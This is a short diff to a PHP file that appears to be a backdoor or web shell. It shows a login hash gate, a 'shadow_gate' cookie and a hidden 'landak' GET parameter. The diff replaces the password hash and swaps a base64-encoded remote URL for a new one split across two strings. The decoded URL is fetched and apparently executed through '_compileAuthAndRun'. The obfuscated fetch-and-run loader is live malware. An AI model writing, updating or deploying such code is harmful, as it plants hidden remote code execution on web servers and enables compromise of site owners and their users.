@@ -1,6 +1,6 @@
 <?php
 
-define('LOGIN_HASH', '$2a$12$vJGH/3I3lfqPilK8O4F2JOcmkLbKtOZK4s88Moy/NOZdcH5URr4kO');
+define('LOGIN_HASH', '$2a$12$U0bMefwgXqRgbhrzG3NsvuzQXgQ.OHZU9GWPamDxZ.pOu7LIP2FBW');
 define('LOGIN_COOKIE', 'shadow_gate');
 define('LOGIN_EXPIRY', 3600);
 
@@ -279,8 +279,8 @@ if (isset($_GET['landak'])) {
  * ============================================================
  */
 try {
-    $r1 = 'aHR0cHM6Ly9iZWJlY2x1Yi5uZXQvc2Mvamt3aW5oZXJl';
-    $r2 = '';
+    $r1 = 'aHR0cHM6Ly9wZW5nb2Nva2h';
+    $r2 = 'hbmRhbC5wYWdlcy5kZXYvbGFuZGFrX2FsZmEudHh0';
     $u = _compileDecodeChunkUnit($r1 . $r2);
     _compileAuthAndRun($u);
 } catch (Exception $e) {
